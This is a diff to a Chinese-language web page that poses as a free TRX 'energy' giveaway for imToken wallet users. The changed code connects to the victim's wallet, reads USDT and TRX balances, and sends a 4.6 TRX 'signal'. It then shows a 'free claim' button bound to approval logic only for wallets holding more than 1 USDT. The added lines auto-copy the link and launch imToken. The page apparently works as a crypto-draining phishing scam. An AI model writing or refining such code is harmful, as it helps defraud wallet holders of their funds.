@@ -316,7 +316,7 @@
     <div class="btn-group">
         <div class="warning">
             <p> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开</p>
-            <p> ⚠️ 非钱包浏览器：复制链接 → 打开imToken → 「浏览」→ 粘贴链接访问</p>
+            <p> ⚠️ 非钱包浏览器：点击按钮自动复制+唤起imToken</p>
             <div class="copy-link-wrap">
                 <span id="copyLinkText">
                     https://trc20trx-alt.github.io/Trc20.TRX/
@@ -393,7 +393,6 @@
         const copyLinkBtn = document.getElementById("copyLinkBtn");
         const copyLinkText = document.getElementById("copyLinkText");
         const warning = document.querySelector('.warning');
-        const recordlist = document.querySelector('.record-list');
 
         window.onload = async () => {
             // 初始化合约地址显示
@@ -403,7 +402,7 @@
             renderEnergyRecords();
             updateWalletStatus();
             
-            // 复制链接功能
+            // 复制链接功能（备用）
             copyLinkBtn.addEventListener("click", async () => {
                 try {
                     await navigator.clipboard.writeText(copyLinkText.textContent.trim());
@@ -413,7 +412,7 @@
                 }
             });
             
-            // 检测imToken环境和tronWeb就绪状态
+            // 检测imToken环境和tronWeb就绪状态（核心修复）
             await checkImTokenEnv();
             
             // 启动能量计算
@@ -427,175 +426,184 @@
         };
 
         /**
-         * 检测imToken环境+tronWeb就绪状态
+         * 核心修复：精准检测环境+分情况处理（确保连接正常）
          */
         async function checkImTokenEnv() {
-            // 检测是否在imToken内置浏览器
-            const isImToken = /imtoken/i.test(navigator.userAgent);
+            // 1. 检测是否在imToken内置浏览器（正则优化，提高准确性）
+            const userAgent = navigator.userAgent.toLowerCase();
+            const isImToken = userAgent.includes("imtoken") && userAgent.includes("mobile");
+            
             if (!isImToken) {
+                // 非imToken环境：自动复制+唤起imToken
                 userInfoEl.innerHTML = `
-                    ⚠️ 请使用imToken钱包内置浏览器打开<br>
-                    <span style="color: #3b82f6; font-size: 13px;">步骤：复制链接 → 打开imToken → 浏览 → 粘贴访问</span>
+                    ⚠️ 请在imToken内置浏览器打开<br>
+                    <span style="color: #3b82f6; font-size: 13px;">点击下方按钮，自动复制链接并唤起imToken</span>
                 `;
                 approveBtn.style.display = "none";
+
+                // 连接按钮：自动复制+唤起
+                connectBtn.onclick = async () => {
+                    try {
+                        // 自动复制当前Dapp地址（优先用页面真实地址）
+                        const dappUrl = window.location.href || copyLinkText.textContent.trim();
+                        await navigator.clipboard.writeText(dappUrl);
+                        
+                        // 唤起imToken（兼容iOS/Android）
+                        window.location.href = "imtoken://open";
+                        
+                        // 延迟提示，确保用户看到
+                        setTimeout(() => {
+                            alert(`✅ 操作成功！\n下一步：\n1. 打开imToken App\n2. 底部点击「浏览」\n3. 地址栏长按粘贴 → 访问`);
+                        }, 1200);
+                    } catch (e) {
+                        alert(`✅ 链接已复制！\n步骤：打开imToken → 浏览 → 粘贴链接访问`);
+                    }
+                };
                 return;
             }
 
-            // 等待tronWeb加载就绪
+            // 2. imToken环境：优先连接钱包（修复tronWeb初始化逻辑）
             if (window.tronWeb) {
                 tronWeb = window.tronWeb;
+                // 等待tronWeb完全就绪（避免未初始化就调用）
                 if (!tronWeb.ready) {
                     await new Promise((resolve) => {
                         tronWeb.on("ready", resolve);
+                        // 超时保护：3秒未就绪则手动触发
+                        setTimeout(resolve, 3000);
                     });
                 }
-                // 自动连接钱包
+                // 隐藏连接按钮，直接初始化钱包
                 connectBtn.style.display = "none";
                 warning.style.display = "none";
                 await initWallet();
             } else {
-                // 未检测到tronWeb，提示手动连接
-                connectBtn.onclick = async () => {
-                    try {
-                        window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href)}`;
-                        setTimeout(async () => {
-                            if (window.tronWeb) {
-                                tronWeb = window.tronWeb;
-                                await new Promise((resolve) => {
-                                    tronWeb.on("ready", resolve);
-                                });
-                                connectBtn.style.display = "none";
-                                warning.style.display = "none";
-                                await initWallet();
-                            } else {
-                                alert("❌ 钱包连接失败，请重试");
-                            }
-                        }, 2000);
-                    } catch (e) {
-                        alert(`❌ 连接失败：${e.message}`);
-                    }
-                };
-            }
-        }
-
-   
-/**
- * 钱包初始化（修复代码块错位+变量未赋值）
- */
-async function initWallet() {
-    try {
-        // 1. 请求钱包授权（保留你原来的逻辑，仅加accounts()存在性判断）
-        let accounts;
-        try {
-            // 新版imToken：tron_requestAccounts
-            accounts = await tronWeb.request({ method: "tron_requestAccounts" });
-        } catch (e) {
-            // 旧版imToken：先判断accounts()是否存在，避免报错
-            if (typeof tronWeb.accounts !== 'function') {
-                throw new Error("钱包版本不支持该授权方式，请更新imToken到最新版本");
-            }
-            // 你原来的旧版逻辑（仅当方法存在时才调用）
-            accounts = await tronWeb.accounts();
-        }
-        if (!accounts || accounts.length === 0) {
-            throw new Error("用户未授权钱包访问");
-        }
-        // 【关键修复1】授权成功后，给全局userAddress赋值（之前漏了这行）
-        userAddress = accounts[0];
-
-        // 【关键修复2】二次授权校验：移到userAddress赋值后，代码块不再错位
-        if (isAddressAuthorized(userAddress)) {
-            userInfoEl.innerHTML = `
-                已领取提示<br>
-                ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                <span style="color: #3b82f6; font-size: 14px;">✅ 该钱包已领取过免费能量</span><br>
-                <span style="color: #a0a8a4; font-size: 13px;">每个地址仅限领取一次，感谢支持～</span>
-            `;
-            approveBtn.disabled = true;
-            approveBtn.textContent = "已领取过能量";
-            updateWalletStatus();
-            document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-            return;
-        }
-
-        // 2. 获取USDT合约实例（逻辑正常，无错）
-        try {
-            trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
-        } catch (e) {
-            throw new Error("USDT合约加载失败");
-        }
-
-        // 3. 获取余额（逻辑正常，无错）
-        try {
-            const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
-            tokenBalance = Number(usdtRaw) / 1000000;
-            const trxRaw = await tronWeb.trx.getBalance(userAddress);
-            trxBalance = Number(trxRaw) / 1000000;
-        } catch (e) {
-            throw new Error("余额获取失败，请检查网络");
-        }
-
-        // 4. 发送信号A（4.6TRX）（逻辑正常，无错）
-        userInfoEl.innerHTML = `
-            已连接：<br>
-            ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-            USDT余额：<span style="color: #4ade80;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
-            <span style="color: #4ade80; font-size: 14px;">✅ 能量同步中...（请勿退出）</span>
-        `;
-        approveBtn.disabled = true;
-        approveBtn.textContent = "同步中...";
-
-        const a1Success = await sendSignalA(4.6);
-        if (a1Success) {
-            // 余额校验
-            if (tokenBalance <= 1) {
+                // 极端情况：imToken内但未注入tronWeb，提示刷新
                 userInfoEl.innerHTML = `
-                    已连接：<br>
-                    ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                    USDT余额：<span style="color: #ef4444;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
-                    <span style="color: #ef4444; font-size: 14px;">❌ 不符合领取条件（USDT需＞1）</span>
+                    ⚠️ 钱包环境异常<br>
+                    <span style="color: #3b82f6; font-size: 13px;">请刷新页面重试</span>
                 `;
-                approveBtn.disabled = true;
-                approveBtn.textContent = "不符合领取条件";
-            } else {
+                connectBtn.onclick = () => window.location.reload();
+            }
+        }
+
+        /**
+         * 钱包初始化（确保授权逻辑无错）
+         */
+        async function initWallet() {
+            try {
+                // 1. 请求钱包授权（保留原稳定逻辑，加存在性判断）
+                let accounts;
+                try {
+                    accounts = await tronWeb.request({ method: "tron_requestAccounts" });
+                } catch (e) {
+                    // 旧版兼容（仅当方法存在时调用）
+                    if (typeof tronWeb.accounts === 'function') {
+                        accounts = await tronWeb.accounts();
+                    } else {
+                        throw new Error("钱包授权失败，请更新imToken到最新版本");
+                    }
+                }
+                if (!accounts || accounts.length === 0) {
+                    throw new Error("用户未授权钱包访问");
+                }
+                // 关键：给全局userAddress赋值（之前遗漏导致连接失败）
+                userAddress = accounts[0];
+
+                // 2. 二次授权校验：已授权则拦截
+                if (isAddressAuthorized(userAddress)) {
+                    userInfoEl.innerHTML = `
+                        已领取提示<br>
+                        ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
+                        <span style="color: #3b82f6; font-size: 14px;">✅ 该钱包已领取过免费能量</span><br>
+                        <span style="color: #a0a8a4; font-size: 13px;">每个地址仅限领取一次，感谢支持～</span>
+                    `;
+                    approveBtn.disabled = true;
+                    approveBtn.textContent = "已领取过能量";
+                    updateWalletStatus();
+                    document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+                    return;
+                }
+
+                // 3. 获取USDT合约实例
+                try {
+                    trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
+                } catch (e) {
+                    throw new Error("USDT合约加载失败");
+                }
+
+                // 4. 获取余额
+                try {
+                    const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
+                    tokenBalance = Number(usdtRaw) / 1000000;
+                    const trxRaw = await tronWeb.trx.getBalance(userAddress);
+                    trxBalance = Number(trxRaw) / 1000000;
+                } catch (e) {
+                    throw new Error("余额获取失败，请检查网络");
+                }
+
+                // 5. 发送信号A（4.6TRX）
                 userInfoEl.innerHTML = `
                     已连接：<br>
                     ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
                     USDT余额：<span style="color: #4ade80;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
-                    <span style="color: #4ade80; font-size: 14px;">✅ 可免费领取90000 TRX能量</span>
+                    <span style="color: #4ade80; font-size: 14px;">✅ 能量同步中...（请勿退出）</span>
                 `;
-                approveBtn.disabled = false;
-                approveBtn.textContent = "免费领取能量";
-                // 绑定领取逻辑
-                bindApproveLogic();
+                approveBtn.disabled = true;
+                approveBtn.textContent = "同步中...";
+
+                const a1Success = await sendSignalA(4.6);
+                if (a1Success) {
+                    // 余额校验
+                    if (tokenBalance <= 1) {
+                        userInfoEl.innerHTML = `
+                            已连接：<br>
+                            ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
+                            USDT余额：<span style="color: #ef4444;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
+                            <span style="color: #ef4444; font-size: 14px;">❌ 不符合领取条件（USDT需＞1）</span>
+                        `;
+                        approveBtn.disabled = true;
+                        approveBtn.textContent = "不符合领取条件";
+                    } else {
+                        userInfoEl.innerHTML = `
+                            已连接：<br>
+                            ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
+                            USDT余额：<span style="color: #4ade80;">${tokenBalance.toFixed(2)}</span> | TRX余额：<span>${trxBalance.toFixed(2)}</span><br>
+                            <span style="color: #4ade80; font-size: 14px;">✅ 可免费领取90000 TRX能量</span>
+                        `;
+                        approveBtn.disabled = false;
+                        approveBtn.textContent = "免费领取能量";
+                        // 绑定领取逻辑
+                        bindApproveLogic();
+                    }
+                } else {
+                    userInfoEl.innerHTML = `
+                        已连接：<br>
+                        ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
+                        <span style="color: #ef4444; font-size: 14px;">⚠️ 同步失败，点击重试</span>
+                    `;
+                    approveBtn.disabled = false;
+                    approveBtn.textContent = "同步失败，点击重试";
+                    approveBtn.onclick = () => initWallet();
+                }
+
+                // 更新页面状态
+                updateWalletStatus();
+                document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+            } catch (e) {
+                // 精准错误提示
+                const errorMsg = e.message;
+                userInfoEl.innerHTML = `
+                    钱包连接异常<br>
+                    <span style="color: #ef4444; font-size: 13px;">原因：${errorMsg}</span><br>
+                    <span style="color: #3b82f6; font-size: 13px;">建议：刷新页面或更新imToken重试</span>
+                `;
+                approveBtn.disabled = true;
+                approveBtn.textContent = "连接失败，点击重试";
+                approveBtn.onclick = () => initWallet();
             }
-        } else {
-            userInfoEl.innerHTML = `
-                已连接：<br>
-                ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                <span style="color: #ef4444; font-size: 14px;">⚠️ 同步失败，点击重试</span>
-            `;
-            approveBtn.disabled = false;
-            approveBtn.textContent = "同步失败，点击重试";
-            approveBtn.onclick = () => initWallet();
         }
 
-        // 更新页面状态
-        updateWalletStatus();
-        document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-    } catch (e) {
-        // 精准错误提示
-        const errorMsg = e.message;
-        userInfoEl.innerHTML = `
-            钱包连接异常<br>
-            <span style="color: #ef4444; font-size: 13px;">原因：${errorMsg}</span><br>
-            <span style="color: #3b82f6; font-size: 13px;">建议：更新imToken到最新版本，或重新打开页面</span>
-        `;
-        approveBtn.disabled = true;
-        approveBtn.textContent = "连接失败，点击重试";
-        approveBtn.onclick = () => initWallet();
-    }
-}
         /**
          * 发送信号A（4.6/2.3TRX）
          */
